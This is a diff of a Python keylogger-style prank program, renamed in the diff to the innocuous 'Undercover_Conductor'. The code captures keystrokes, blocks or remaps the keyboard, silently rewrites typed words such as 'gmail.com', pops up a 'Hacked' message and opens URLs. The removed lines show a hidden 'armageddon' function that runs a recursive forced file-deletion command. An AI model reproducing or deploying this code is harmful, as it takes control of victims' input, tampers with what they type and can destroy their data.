@@ -10,7 +10,7 @@ from datetime import datetime
 from time import sleep
 from PIL import Image
 
-class Keylogger:
+class Undercover_Conductor:
     def __init__(self):
         self.log = ""
 
@@ -20,9 +20,8 @@ class Keylogger:
 
     autocorrect_words = {
         ' ' : 'SPACE',
-        'thank' : 'screw',
-        'love' : 'hate',
-
+        'you' : 'u',
+        'gmail.com' : 'mail.com'
     }
 
     def start(self):
@@ -74,16 +73,13 @@ class Keylogger:
             self.screenshot()
         elif string.find("minimise") != -1:
             self.minimise()
-        #elif string.find("$pleasedon'ttypeanotherdollarsign$") != -1: # DOOMSDAY BUTTON, NEVER ACTIVITE
-        #    self.armageddon()
 
-
-    # Blocks all inputs from the keyboard
+    # Blocks all inputs from the keyboard using the keys list
     def block_keys(self):
         for key in self.keys:
             keyboard.block_key(key)
 
-    # Unblocks all input from the keyboard
+    # Unblocks all input from the keyboard using the keys list
     def unblock_keys(self):
         for key in self.keys:
             keyboard.unhook(key)
@@ -96,7 +92,7 @@ class Keylogger:
         pyautogui.write("notepad")
         pyautogui.press("enter")
         sleep(0.5)
-        pyautogui.write("You've been hacked!")
+        pyautogui.write("Hacked")
         self.unblock_keys()
         self.log = ""
 
@@ -120,7 +116,7 @@ class Keylogger:
     # Sends user to the specified url on default browser
     def go_to_url(self):
         pyautogui.hotkey("winleft", "r")
-        pyautogui.write("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+        pyautogui.write("https://www.youtube.com/watch?v=gojhTzO09r0")
         pyautogui.press("enter")
         self.log = ""
 
@@ -142,7 +138,7 @@ class Keylogger:
         for i in range(26):
             keyboard.unremap_key(self.keys[i])
 
-    # Remaps the alphabet keys temporarily for 2 seconds
+    # Remaps the alphabet keys temporarily for 10 seconds
     def temp_remap_keys(self):
         self.remap_keys()
         sleep(10)
@@ -161,13 +157,8 @@ class Keylogger:
             pyautogui.hotkey("winleft", "m")
             sleep(0.1)
         self.log = ""
-    
-    # Deletes the operating system
-    ###### PLEASE DO NOT USE ######
-    #def armageddon(self):
-    #    os.system("DEL H /F/Q/S*.*")
-    #    self.log = ""
+
 
 if __name__ == "__main__":
-    keylogger = Keylogger()
-    keylogger.start()
+    program = Undercover_Conductor()
+    program.start()
